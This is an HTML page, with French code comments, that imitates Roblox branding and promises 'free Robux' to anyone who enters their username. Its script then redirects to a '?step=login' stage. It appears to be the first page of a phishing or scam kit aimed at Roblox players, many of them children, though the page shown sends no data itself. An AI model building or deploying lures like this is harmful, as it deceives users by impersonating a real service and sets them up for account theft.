<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #0b0e1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        /* ============================================================
           HEADER : Partners Program | How it works?
           ============================================================ */
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding: 0 2px;
        }

        .header-top .partners {
            font-size: 14px;
            font-weight: 600;
            color: #ffffff;
            letter-spacing: 0.2px;
        }

        .header-top .how-it-works {
            font-size: 13px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.4);
            cursor: pointer;
            transition: color 0.2s;
        }

        .header-top .how-it-works:hover {
            color: #ffffff;
        }

        /* ============================================================
           LOGO ROBLOX
           ============================================================ */
        .roblox-logo {
            font-size: 48px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: -2px;
            margin-bottom: 8px;
        }

        .roblox-logo .highlight {
            color: #00b2ff;
        }

        /* ============================================================
           TEXTE
           ============================================================ */
        .subtitle {
            font-size: 14px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 24px;
            line-height: 1.5;
        }

        /* ============================================================
           CHAMP DE SAISIE
           ============================================================ */
        .input-group {
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            padding: 16px 18px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            outline: none;
            background: rgba(255, 255, 255, 0.03);
            color: #ffffff;
            transition: all 0.3s ease;
            text-align: left;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 400;
        }

        .input-group input:focus {
            border-color: #1DB954;
            background: rgba(29, 185, 84, 0.04);
            box-shadow: 0 0 0 4px rgba(29, 185, 84, 0.06);
        }

        .error-msg {
            color: #ff3b30;
            font-size: 12px;
            margin-top: 6px;
            display: none;
            text-align: left;
        }

        /* ============================================================
           BOUTON CONTINUE
           ============================================================ */
        .btn-continue {
            width: 100%;
            background: #1DB954;
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            box-shadow: 0 4px 20px rgba(29, 185, 84, 0.2);
            margin-top: 4px;
        }

        .btn-continue:hover {
            transform: scale(1.01);
            box-shadow: 0 6px 28px rgba(29, 185, 84, 0.3);
        }

        .btn-continue:active {
            transform: scale(0.98);
        }

        .btn-continue:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media (max-width: 420px) {
            .container { padding: 0 8px; }
            .roblox-logo { font-size: 38px; }
            .subtitle { font-size: 13px; }
            .input-group input { font-size: 14px; padding: 14px 16px; }
            .btn-continue { font-size: 15px; padding: 14px; }
            .header-top .partners { font-size: 13px; }
            .header-top .how-it-works { font-size: 12px; }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ============================================================
        HEADER
        ============================================================ -->
        <div class="header-top">
            <span class="partners">Partners Program</span>
            <span class="how-it-works" onclick="alert('How it works?')">How it works?</span>
        </div>

        <!-- ============================================================
        LOGO ROBLOX
        ============================================================ -->
        <div class="roblox-logo">
            RO<span class="highlight">BLOX</span>
        </div>

        <!-- ============================================================
        TEXTE
        ============================================================ -->
        <p class="subtitle">
            Enter your Roblox username to start getting free Robux
        </p>

        <!-- ============================================================
        FORMULAIRE
        ============================================================ -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Type your username ..." autofocus />
                <div class="error-msg" id="errorMsg">Veuillez entrer un nom d'utilisateur valide.</div>
            </div>

            <button type="submit" class="btn-continue" id="submitBtn">
                <span class="btn-content">
                    <span id="btnText">Continue</span>
                    <span class="spinner" id="btnSpinner"></span>
                </span>
            </button>
        </form>

    </div>

    <script>
        // ============================================================
        // SOUMISSION
        // ============================================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const errorMsg = document.getElementById('errorMsg');
            const submitBtn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');

            if (!username || username.length < 2) {
                errorMsg.style.display = 'block';
                return;
            }

            errorMsg.style.display = 'none';

            submitBtn.disabled = true;
            btnText.textContent = 'Loading...';
            btnSpinner.style.display = 'block';

            // Simuler envoi
            setTimeout(() => {
                // Rediriger vers l'étape 2 (connexion)
                window.location.href = '?step=login';
                // ou tu peux faire une alerte pour le test
                // alert('Username: ' + username + '\nConnexion réussie !');
                submitBtn.disabled = false;
                btnText.textContent = 'Continue';
                btnSpinner.style.display = 'none';
            }, 1200);
        });

        // Effacer l'erreur quand l'utilisateur tape
        document.getElementById('username').addEventListener('input', function() {
            document.getElementById('errorMsg').style.display = 'none';
        });
    </script>

</body>
</html>
